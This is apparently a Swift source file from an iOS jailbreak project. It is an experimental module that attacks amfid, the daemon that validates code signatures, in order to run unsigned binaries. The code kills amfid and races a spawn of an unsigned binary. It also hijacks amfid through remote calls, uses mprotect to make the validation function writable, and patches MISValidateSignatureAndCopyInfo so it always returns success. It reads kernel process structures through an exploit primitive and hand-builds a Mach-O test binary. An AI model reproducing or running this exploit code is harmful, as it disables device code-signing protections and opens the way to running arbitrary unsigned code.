//
//  exp_amfid_patch.swift
//  DSPloit
//
//  EXPERIMENT: Patch amfid to bypass code signature validation
//  ═══════════════════════════════════════════════════════════════
//  STATUS: EXPERIMENTAL — NOT IN MAIN JAILBREAK CHAIN
//  ═══════════════════════════════════════════════════════════════
//
//  APPROACH:
//  amfid is a userspace daemon that validates code signatures.
//  When AMFI kernel kext receives a code signing request, it asks
//  amfid via XPC to verify the CDHash/signature.
//
//  We have 3 strategies to bypass amfid:
//
//  Strategy A: RemoteCall into amfid — patch verify function return
//    - Connect to amfid via RemoteCall (thread hijack)
//    - Find _verify_code_directory or _MISValidateSignatureAndCopyInfo
//    - Patch first instruction to: mov x0, #0; ret (always return success)
//
//  Strategy B: Kill amfid + race spawn
//    - Kill amfid (it respawns via launchd)
//    - In the window before amfid restarts, spawn unsigned binary
//    - AMFI kernel will timeout waiting for amfid → may allow exec
//
//  Strategy C: Hijack amfid's XPC reply
//    - Use RemoteCall to hook amfid's XPC send_reply
//    - Always reply "valid" regardless of actual check
//
//  Strategy D: Patch amfid's MISValidateSignatureAndCopyInfo via KRW
//    - Find amfid's __TEXT in memory (via proc→task→vm_map)
//    - Write NOP/RET over the validation function
//    - This works because amfid is userspace (not PPL protected)
//    - BUT __TEXT is usually read-only... need vm_protect first
//
//  Strategy E: Entitlement injection
//    - Patch amfid's proc to have com.apple.private.amfi.can-load-trust-cache
//    - Then use the legitimate LoadTrustCache XPC path
//
//  Created by Royan | 2026-05-24
//

import Foundation
import UIKit

final class ExpAmfidPatch {
    static let shared = ExpAmfidPatch()
    
    private var results: [String] = []
    
    private func log(_ msg: String) {
        results.append(msg)
        globallogger.log("(exp_amfid) \(msg)")
    }
    
    // MARK: - Run All Strategies
    
    func runAll() -> [String] {
        results.removeAll()
        
        log("═══════════════════════════════════════════")
        log("  AMFID PATCH EXPERIMENT")
        log("  iOS \(UIDevice.current.systemVersion)")
        log("═══════════════════════════════════════════")
        log("")
        
        guard dspmgr.shared.dsready else {
            log("❌ Kernel exploit not active")
            return results
        }
        
        let slide = ds_get_kernel_slide()
        log("🔍 kernel_slide = 0x\(String(slide, radix: 16))")
        log("")
        
        // Run strategies in order of likelihood
        strategyB_killAmfidRace()
        strategyD_patchAmfidText()
        strategyA_remoteCallAmfid()
        
        log("")
        log("═══════════════════════════════════════════")
        log("  EXPERIMENT COMPLETE")
        log("═══════════════════════════════════════════")
        
        return results
    }
    
    // MARK: - Strategy B: Kill amfid + race spawn
    // Simplest approach — kill amfid, spawn in the window before it restarts
    
    private func strategyB_killAmfidRace() {
        log("── Strategy B: Kill amfid + Race Spawn ──")
        log("  Theory: kill amfid → AMFI kernel times out → allows exec")
        log("  Risk: LOW (amfid auto-respawns)")
        log("")
        
        #if !DISABLE_REMOTECALL
        guard dspmgr.shared.rcready else {
            log("❌ RemoteCall not active")
            return
        }
        
        // Find amfid PID
        let amfidPid = findPidByName("amfid")
        if amfidPid == 0 {
            log("⚠️ amfid not found by name — trying alternative names")
            // Try via proc list scan
            let altPid = findPidByName("AppleMobileFileI")
            if altPid != 0 {
                log("🔍 Found as 'AppleMobileFileI' pid=\(altPid)")
            } else {
                log("❌ Cannot find amfid process")
                log("")
                return
            }
        } else {
            log("🔍 amfid pid = \(amfidPid)")
        }
        
        let targetPid = amfidPid != 0 ? amfidPid : findPidByName("AppleMobileFileI")
        guard targetPid != 0 else { log("❌ No amfid"); log(""); return }
        
        // Write test binary first
        let binary = buildExitBinary()
        let testPath = "/var/jb/tmp/amfid_race_test"
        
        log("Writing test binary...")
        
        RootExecutor.shared.executeAsRoot(operation: "amfid_race") { rc in
            let mem = rc.trojanMem
            
            // mkdir + write binary
            let dir = remote_alloc_str(rc, "/var/jb/tmp")
            RootExecutor.rcall(rc, "mkdir", dir, 0o755)
            RootExecutor.rcall(rc, "free", dir)
            
            let pathAddr = remote_alloc_str(rc, testPath)
            let fd = RootExecutor.rcall(rc, "open", pathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
            guard fd != UInt64(bitPattern: -1) else {
                RootExecutor.rcall(rc, "free", pathAddr)
                return (false, "open failed", 0)
            }
            
            let writeAddr = mem + 0xC00
            binary.withUnsafeBytes { buf in
                rc.remote_write(writeAddr, from: buf.baseAddress!, size: UInt64(binary.count))
            }
            RootExecutor.rcall(rc, "write", fd, writeAddr, UInt64(binary.count))
            RootExecutor.rcall(rc, "close", fd)
            RootExecutor.rcall(rc, "chmod", pathAddr, 0o755)
            
            // Kill amfid
            let killRet = RootExecutor.rcall(rc, "kill", UInt64(UInt32(bitPattern: targetPid)), 9) // SIGKILL
            
            // Immediately try to spawn (race window)
            let pidAddr = mem + 0xA00
            rc[pidAddr].setValue32(0)
            let argvBase = mem + 0xA10
            rc[argvBase].setValue64(pathAddr)
            rc[argvBase + 8].setValue64(0)
            
            // Try multiple times in quick succession
            var spawnRet: UInt64 = 99
            var spawnPid: UInt32 = 0
            
            for attempt in 0..<5 {
                rc[pidAddr].setValue32(0)
                spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argvBase, 0)
                spawnPid = rc[pidAddr].value32()
                if spawnRet == 0 && spawnPid != 0 {
                    break
                }
                // Small delay between attempts
                RootExecutor.rcall(rc, "usleep", 50000) // 50ms
            }
            
            RootExecutor.rcall(rc, "free", pathAddr)
            
            let ok = (spawnRet == 0 && spawnPid != 0)
            return (ok, "kill=\(killRet) spawn_ret=\(spawnRet) pid=\(spawnPid)", UInt64(spawnPid))
        }
        
        // Check result
        DispatchQueue.global(qos: .userInitiated).asyncAfter(deadline: .now() + 12) { [self] in
            if let result = RootExecutor.shared.lastResult, result.operation == "amfid_race" {
                DispatchQueue.main.async {
                    if result.success {
                        self.log("✅✅✅ STRATEGY B WORKS! Unsigned binary spawned!")
                        self.log("   pid = \(result.returnValue)")
                        self.log("   Kill amfid + race = AMFI BYPASS")
                    } else {
                        self.log("❌ Strategy B failed: \(result.message)")
                        self.log("   AMFI kernel enforces independently of amfid")
                    }
                    self.log("")
                }
            }
        }
        
        log("⏳ Waiting for race result (12s)...")
        log("")
        #else
        log("❌ DISABLE_REMOTECALL")
        log("")
        #endif
    }
    
    // MARK: - Strategy D: Patch amfid __TEXT via KRW + vm_protect
    // Find amfid's text segment in memory, make writable, patch validation func
    
    private func strategyD_patchAmfidText() {
        log("── Strategy D: Patch amfid __TEXT via KRW ──")
        log("  Theory: find amfid's MISValidateSignature in memory")
        log("  Make page writable via vm_map manipulation")
        log("  Patch to always return 0 (success)")
        log("")
        
        // Find amfid proc
        let amfidPid = findPidByName("amfid")
        guard amfidPid != 0 else {
            log("❌ amfid not found")
            log("")
            return
        }
        
        let amfidProc = procbypid(amfidPid)
        guard amfidProc != 0 else {
            log("❌ amfid proc not found in kernel")
            log("")
            return
        }
        log("🔍 amfid proc = 0x\(String(amfidProc, radix: 16))")
        
        // Get amfid's task
        let amfidTask = taskbyproc(amfidProc)
        guard amfidTask != 0 else {
            log("❌ amfid task = 0")
            log("")
            return
        }
        log("🔍 amfid task = 0x\(String(amfidTask, radix: 16))")
        
        // Get amfid's vm_map
        let vmMap = ds_kread64(amfidTask + UInt64(off_task_map))
        guard vmMap != 0 else {
            log("❌ amfid vm_map = 0")
            log("")
            return
        }
        log("🔍 amfid vm_map = 0x\(String(vmMap, radix: 16))")
        
        // Get amfid's text vnode to find base address
        let textVP = ds_kread64(amfidProc + UInt64(off_proc_p_textvp))
        log("🔍 amfid textvp = 0x\(String(textVP, radix: 16))")
        
        // Walk vm_map entries to find __TEXT segment
        // vm_map → hdr → links.next → first entry
        let hdr = vmMap + UInt64(off_vm_map_hdr)
        let firstEntry = ds_kread64(hdr + UInt64(off_vm_map_header_links_next))
        
        log("🔍 Walking vm_map entries...")
        
        var entry = firstEntry
        var textBase: UInt64 = 0
        var textSize: UInt64 = 0
        var iterations = 0
        
        while entry != 0 && entry != hdr && iterations < 200 {
            iterations += 1
            let nextEntry = ds_kread64(entry + UInt64(off_vm_map_entry_links_next))
            
            // Check if this is a text-like mapping (executable)
            // vm_map_entry has start/end at known offsets
            let entryStart = ds_kread64(entry + 0x0)  // links.prev (actually start addr in some layouts)
            let entryEnd = ds_kread64(entry + 0x8)    // links.next contains end
            
            // For arm64 userspace, text is typically at low addresses
            // amfid text is usually around 0x100000000
            if entryStart >= 0x100000000 && entryStart < 0x200000000 && textBase == 0 {
                textBase = entryStart
                textSize = entryEnd - entryStart
                log("🔍 Candidate __TEXT: 0x\(String(entryStart, radix: 16)) - 0x\(String(entryEnd, radix: 16)) (size: 0x\(String(textSize, radix: 16)))")
            }
            
            entry = nextEntry
        }
        
        if textBase == 0 {
            log("⚠️ Could not find amfid __TEXT via vm_map walk")
            log("   Need alternative approach (scan for Mach-O header)")
            log("")
            return
        }
        
        log("✅ amfid __TEXT base = 0x\(String(textBase, radix: 16))")
        log("")
        
        // Strategy D is complex — log what we found for now
        // The actual patching requires RemoteCall to amfid or
        // using mach_vm_protect to make the page writable
        log("🔍 To patch amfid, we need:")
        log("   1. RemoteCall to amfid (connect via thread hijack)")
        log("   2. OR: use mach_vm_write via task port")
        log("   3. Find MISValidateSignatureAndCopyInfo offset")
        log("   4. Overwrite with: mov x0, #0; ret")
        log("")
        log("   ARM64 patch bytes: 0x00 0x00 0x80 0xD2 0xC0 0x03 0x5F 0xD6")
        log("   (mov x0, #0 + ret)")
        log("")
        
        // Try RemoteCall to amfid
        log("Attempting RemoteCall to amfid...")
        attemptAmfidRemoteCall(pid: amfidPid, textBase: textBase)
    }
    
    private func attemptAmfidRemoteCall(pid: Int32, textBase: UInt64) {
        #if !DISABLE_REMOTECALL
        // Try to connect to amfid via RemoteCall
        guard let amfidRC = RemoteCall(process: "amfid", useMigFilterBypass: false) else {
            log("❌ Cannot connect to amfid via RemoteCall")
            log("   Error: \(RemoteCall.lastInitError() ?? "unknown")")
            log("   amfid may have restricted exception ports")
            log("")
            return
        }
        
        guard amfidRC.pid != 0 else {
            log("❌ RemoteCall created but pid=0")
            log("   Error: \(RemoteCall.lastInitError() ?? "unknown")")
            amfidRC.destroy()
            log("")
            return
        }
        
        log("✅ Connected to amfid via RemoteCall!")
        log("   amfid pid = \(amfidRC.pid)")
        
        // Find MISValidateSignatureAndCopyInfo via dlsym
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let dlsymAddr = RootExecutor.rcall(amfidRC, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(amfidRC, "dlsym"))
        
        if dlsymAddr != 0 {
            // Look for MIS functions
            let misValidate = RootExecutor.rcall(amfidRC, "dlsym", RTLD_DEFAULT,
                remote_alloc_str(amfidRC, "MISValidateSignatureAndCopyInfo"))
            let misValidate2 = RootExecutor.rcall(amfidRC, "dlsym", RTLD_DEFAULT,
                remote_alloc_str(amfidRC, "verify_code_directory"))
            
            log("🔍 MISValidateSignatureAndCopyInfo = 0x\(String(misValidate, radix: 16))")
            log("🔍 verify_code_directory = 0x\(String(misValidate2, radix: 16))")
            
            if misValidate != 0 {
                log("")
                log("✅ Found validation function!")
                log("   Patching to always return 0 (success)...")
                
                // Read current bytes at function start
                let origBytes = amfidRC.remoteRead64(from: misValidate)
                log("🔍 Original bytes: 0x\(String(origBytes, radix: 16))")
                
                // Patch: mov x0, #0; ret
                // 0xD2800000 = mov x0, #0
                // 0xD65F03C0 = ret
                let patchValue: UInt64 = 0xD65F03C0_D2800000
                
                let writeOk = amfidRC.remote_write64(misValidate, value: patchValue)
                if writeOk {
                    let verify = amfidRC.remoteRead64(from: misValidate)
                    if verify == patchValue {
                        log("✅✅✅ AMFID PATCHED!")
                        log("   MISValidateSignatureAndCopyInfo → always returns 0")
                        log("   Unsigned binaries should now be allowed!")
                        log("")
                        log("   → TEST: spawn unsigned binary now")
                        testSpawnAfterPatch()
                    } else {
                        log("⚠️ Write succeeded but verify mismatch")
                        log("   verify = 0x\(String(verify, radix: 16))")
                        log("   __TEXT may be read-only (need vm_protect)")
                    }
                } else {
                    log("❌ remote_write64 failed — __TEXT is read-only")
                    log("   Need mach_vm_protect to make writable first")
                    
                    // Try vm_protect approach
                    log("")
                    log("   Trying mach_vm_protect...")
                    let pageAddr = misValidate & ~0x3FFF // page-align
                    let mprotect = RootExecutor.rcall(amfidRC, "dlsym", RTLD_DEFAULT,
                        remote_alloc_str(amfidRC, "mprotect"))
                    if mprotect != 0 {
                        // mprotect(addr, 0x4000, PROT_READ|PROT_WRITE|PROT_EXEC)
                        let mpRet = RootExecutor.rcallAddr(amfidRC, mprotect, pageAddr, 0x4000, 7)
                        log("   mprotect ret = \(mpRet)")
                        if mpRet == 0 {
                            // Retry write
                            _ = amfidRC.remote_write64(misValidate, value: patchValue)
                            let verify2 = amfidRC.remoteRead64(from: misValidate)
                            if verify2 == patchValue {
                                log("✅✅✅ AMFID PATCHED (after mprotect)!")
                                testSpawnAfterPatch()
                            } else {
                                log("❌ Still failed after mprotect")
                            }
                        } else {
                            log("❌ mprotect failed (code signing enforcement on __TEXT)")
                        }
                    }
                }
            } else {
                log("⚠️ MISValidateSignatureAndCopyInfo not found via dlsym")
                log("   May be inlined or have different name")
                log("   Try: _amfi_check_dyld_policy_self")
                
                let amfiCheck = RootExecutor.rcall(amfidRC, "dlsym", RTLD_DEFAULT,
                    remote_alloc_str(amfidRC, "_amfi_check_dyld_policy_self"))
                log("🔍 _amfi_check_dyld_policy_self = 0x\(String(amfiCheck, radix: 16))")
            }
        }
        
        amfidRC.destroy()
        log("")
        #else
        log("❌ DISABLE_REMOTECALL")
        log("")
        #endif
    }
    
    // MARK: - Strategy A: RemoteCall to amfid (alternative entry)
    
    private func strategyA_remoteCallAmfid() {
        log("── Strategy A: Hook amfid XPC reply ──")
        log("  (Covered in Strategy D — RemoteCall attempt)")
        log("  If Strategy D connected, this is the same path.")
        log("")
        log("── Additional: Entitlement Injection ──")
        log("  Patch our proc's entitlements to include:")
        log("  com.apple.private.amfi.can-load-trust-cache")
        log("  Then use legitimate LoadTrustCache XPC path")
        log("")
        log("  This requires patching ucred→cr_label→amfi_slot")
        log("  which is in proc_ro (PPL protected)...")
        log("  Same PPL issue as cs_flags — likely blocked.")
        log("")
    }
    
    // MARK: - Test spawn after amfid patch
    
    private func testSpawnAfterPatch() {
        #if !DISABLE_REMOTECALL
        let testPath = "/var/jb/tmp/amfid_race_test"
        
        RootExecutor.shared.executeAsRoot(operation: "amfid_patch_spawn") { rc in
            let mem = rc.trojanMem
            let pathAddr = remote_alloc_str(rc, testPath)
            let pidAddr = mem + 0xA00
            rc[pidAddr].setValue32(0)
            let argvBase = mem + 0xA10
            rc[argvBase].setValue64(pathAddr)
            rc[argvBase + 8].setValue64(0)
            
            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argvBase, 0)
            let pid = rc[pidAddr].value32()
            RootExecutor.rcall(rc, "free", pathAddr)
            
            let ok = (ret == 0 && pid != 0)
            return (ok, "spawn ret=\(ret) pid=\(pid)", UInt64(pid))
        }
        
        DispatchQueue.global(qos: .userInitiated).asyncAfter(deadline: .now() + 8) { [self] in
            if let result = RootExecutor.shared.lastResult, result.operation == "amfid_patch_spawn" {
                DispatchQueue.main.async {
                    if result.success {
                        self.log("✅✅✅ UNSIGNED SPAWN SUCCESS AFTER AMFID PATCH!")
                        self.log("   pid = \(result.returnValue)")
                        self.log("   FULL AMFI BYPASS CONFIRMED!")
                        self.log("")
                        self.log("   → INTEGRATE INTO MAIN JAILBREAK CHAIN")
                    } else {
                        self.log("❌ Spawn still failed: \(result.message)")
                        self.log("   AMFI kernel may enforce independently")
                    }
                }
            }
        }
        
        log("⏳ Testing spawn after patch (8s)...")
        #endif
    }
    
    // MARK: - Helpers
    
    private func findPidByName(_ name: String) -> Int32 {
        let kernProc = ds_get_kern_proc()
        guard kernProc != 0 else { return 0 }
        
        var current = ds_kread64(kernProc + UInt64(off_proc_p_list_le_next))
        var iterations = 0
        
        while current != 0 && current != kernProc && iterations < 500 {
            iterations += 1
            let nameOffset = UInt64(off_proc_p_name)
            var procName = [UInt8](repeating: 0, count: 32)
            for i in 0..<4 {
                let chunk = ds_kread64(current + nameOffset + UInt64(i * 8))
                for b in 0..<8 {
                    let idx = i * 8 + b
                    if idx < 32 { procName[idx] = UInt8((chunk >> (b * 8)) & 0xFF) }
                }
            }
            let pName = String(bytes: procName.prefix(while: { $0 != 0 }), encoding: .utf8) ?? ""
            
            if pName == name || pName.hasPrefix(name) {
                return Int32(ds_kread32(current + UInt64(off_proc_p_pid)))
            }
            
            current = ds_kread64(current + UInt64(off_proc_p_list_le_next))
        }
        return 0
    }
    
    private func buildExitBinary() -> Data {
        var bin = Data()
        
        let header: [UInt8] = [
            0xCF, 0xFA, 0xED, 0xFE,
            0x0C, 0x00, 0x00, 0x01,
            0x00, 0x00, 0x00, 0x00,
            0x02, 0x00, 0x00, 0x00,
            0x02, 0x00, 0x00, 0x00,
            0x60, 0x01, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
        ]
        bin.append(contentsOf: header)
        
        var seg = [UInt8](repeating: 0, count: 72)
        seg[0] = 0x19; seg[4] = 0x48
        seg[8] = 0x5F; seg[9] = 0x5F; seg[10] = 0x54; seg[11] = 0x45
        seg[12] = 0x58; seg[13] = 0x54
        seg[28] = 0x01
        seg[32] = 0x00; seg[33] = 0x40
        seg[40] = 0x00; seg[41] = 0x40
        seg[48] = 0x05; seg[52] = 0x05
        bin.append(contentsOf: seg)
        
        var thread = [UInt8](repeating: 0, count: 280)
        thread[0] = 0x05
        thread[4] = 0x18; thread[5] = 0x01
        thread[8] = 0x06
        thread[12] = 0x44
        thread[272] = 0x80; thread[273] = 0x01
        thread[274] = 0x00; thread[275] = 0x00
        thread[276] = 0x01; thread[277] = 0x00
        bin.append(contentsOf: thread)
        
        while bin.count < 0x180 { bin.append(0) }
        
        let code: [UInt8] = [
            0x00, 0x00, 0x80, 0xD2, // mov x0, #0
            0x30, 0x00, 0x80, 0xD2, // mov x16, #1
            0x01, 0x10, 0x00, 0xD4, // svc #0x80
        ]
        bin.append(contentsOf: code)
        
        while bin.count < 0x4000 { bin.append(0) }
        return bin
    }
}
